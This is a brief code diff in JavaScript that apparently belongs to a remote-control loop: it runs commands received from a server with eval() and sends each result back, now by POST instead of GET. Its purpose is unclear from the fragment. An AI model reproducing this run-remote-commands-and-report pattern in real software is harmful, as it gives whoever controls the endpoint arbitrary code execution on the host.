@@ -80,8 +80,8 @@ while(runLoop) {
         console.log("Executing command " + commandId + ": " + command);
         var result = eval(command);
         console.log("####"+commandId+"####"+result+"####");
-        var url = 'send_result/'+commandId+'/'+encodeURIComponent(result);
-        doCurl('GET', endpoint + url, null, function(err, res) {
+        var url = 'send_result/'+commandId;
+        doCurl('POST', endpoint + url, {result: result}, function(err, res) {
           console.log("Sent result to server");
         });
       }
